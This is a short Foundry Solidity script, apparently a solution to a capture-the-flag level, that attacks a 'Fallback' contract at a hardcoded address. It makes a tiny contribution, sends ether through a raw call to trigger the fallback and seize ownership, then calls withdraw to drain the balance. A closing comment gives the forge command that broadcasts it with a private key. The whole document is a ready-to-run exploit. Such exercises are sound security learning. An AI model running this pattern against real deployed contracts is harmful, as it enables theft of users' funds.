// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "contracts/1Fallback.sol";

contract FallbackAttackerScript is Script {
    Fallback public targetContract = Fallback(payable(0x462cbc4e87A29724276986561AAe35D193da5156));

    function run() public {
        vm.startBroadcast();
        targetContract.contribute{value: 1 wei}();
        address(targetContract).call{value: 1 wei}("");
        targetContract.withdraw();
        vm.stopBroadcast();
    }
}
// called with:
// forge script script/1Fallback.s.sol --private-key $PKEY --broadcast -vvvv --rpc-url $RPC_URL
